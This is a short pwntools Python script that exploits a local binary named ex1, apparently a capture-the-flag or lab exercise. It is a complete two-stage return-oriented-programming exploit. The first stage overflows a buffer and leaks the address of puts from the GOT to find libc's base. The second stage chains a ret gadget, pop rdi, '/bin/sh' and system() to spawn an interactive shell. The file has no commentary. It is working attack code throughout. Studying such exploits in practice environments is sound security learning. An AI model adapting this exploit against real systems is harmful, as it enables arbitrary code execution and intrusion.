from pwn import *

context.update(arch='amd64', os='linux')
target = process('./bin/ex1')

offset = 40
pop_rdi_rbp = 0x401193
fake_addr = 0xBEEF

elf = ELF('./bin/ex1')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_sym = elf.symbols['main']

payload1 = flat({
    offset: [
        pop_rdi_rbp,
        puts_got,
        fake_addr,
        puts_plt,
        main_sym
    ]
})

x = target.recvline()
x = target.recvline()

target.sendline(payload1)
out_addr = target.recvline()
addr = int.from_bytes(out_addr.rstrip(b'\n'), byteorder='little')

print(f"puts addr: {hex(addr)}")

x = target.recvline()
x = target.recvline()


libc_path = "/usr/lib/x86_64-linux-gnu/libc.so.6"

libc = ELF(libc_path)
puts_offset = libc.symbols['puts']
libc.address = addr - puts_offset
rop = ROP(libc)

system_addr = libc.symbols["system"]
exit_addr = libc.symbols["exit"]
binsh = next(libc.search(b"/bin/sh\x00"))
ret_gadget = rop.find_gadget(['ret'])
ret_gadget = ret_gadget.address


print(hex(system_addr))
print(hex(exit_addr))
print(hex(binsh))

payload2 = flat({
    offset: [
        ret_gadget,
        pop_rdi_rbp,
        binsh,
        fake_addr,
        system_addr,
        exit_addr
    ]
})

target.send(payload2)

target.interactive()
